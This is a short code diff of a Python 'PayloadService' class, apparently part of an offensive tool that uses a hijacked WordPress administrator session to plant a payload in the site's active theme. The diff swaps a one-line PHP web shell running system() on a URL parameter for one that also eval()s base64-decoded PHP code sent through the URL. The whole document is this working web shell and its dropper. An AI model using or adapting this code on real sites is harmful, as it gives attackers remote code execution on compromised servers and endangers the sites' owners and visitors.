@@ -7,7 +7,7 @@ class PayloadService:
     def __init__(self, wp_url: str, wp_admin_session: Session):
         self.wp_url = wp_url
         self.wp_admin_session = wp_admin_session
-        self.payload = "<?php if(isset($_GET['omega'])){system($_GET['omega']);}?>\n"
+        self.payload = "<?php if(isset($_GET['omega'])){ if(isset($_GET['php'])){ eval(base64_decode($_GET['omega'])); }else{ system($_GET['omega']); } }?>\n"
 
     def drop_payload(self) -> str:
         active_theme_name = self.get_theme_name()
